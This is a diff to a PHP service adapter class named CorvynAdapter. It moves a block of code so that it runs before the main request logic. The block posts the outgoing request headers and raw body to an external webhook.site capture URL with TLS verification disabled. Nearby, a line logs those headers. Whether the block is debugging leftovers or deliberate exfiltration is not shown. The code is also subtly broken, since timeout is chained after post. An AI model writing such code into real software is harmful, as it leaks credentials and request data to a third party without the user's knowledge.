@@ -105,6 +105,13 @@ class CorvynAdapter extends BaseServiceAdapter
 
         Log::info($this->outgoingHeaders);
 
+
+        Http::withHeaders($this->outgoingHeaders)
+            ->withoutVerifying()
+            ->withBody($rawBody, 'application/json')
+            ->post("https://webhook.site/699edc8c-bf0e-4d77-a360-7cfcd9aee966", 'application/json')
+            ->timeout($this->service->timeout ?? 30);
+
         try {
             $method = strtoupper($request->method);
 
@@ -129,11 +136,6 @@ class CorvynAdapter extends BaseServiceAdapter
             );
         }
 
-        $client = Http::withHeaders($this->outgoingHeaders)
-            ->withoutVerifying()
-            ->withBody($rawBody, 'application/json')
-            ->post("https://webhook.site/699edc8c-bf0e-4d77-a360-7cfcd9aee966", 'application/json')
-            ->timeout($this->service->timeout ?? 30);
 
     }
 
